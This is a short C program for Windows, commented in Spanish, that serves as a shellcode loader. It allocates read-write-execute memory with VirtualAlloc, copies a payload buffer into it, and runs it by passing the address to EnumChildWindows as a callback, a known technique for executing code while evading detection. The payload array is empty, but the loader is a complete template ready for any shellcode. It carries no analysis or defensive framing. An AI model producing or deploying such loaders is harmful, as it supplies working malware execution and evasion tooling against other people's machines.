#include <windows.h>

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{	
	// Alocación de memoria 
	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copiado de shellcode
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));

	// Enumera las ventanas secundarias de la ventana principal y pasa la direccion de memoria
	// mem como una funcion de devolucion de llamada 
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	return 0;
};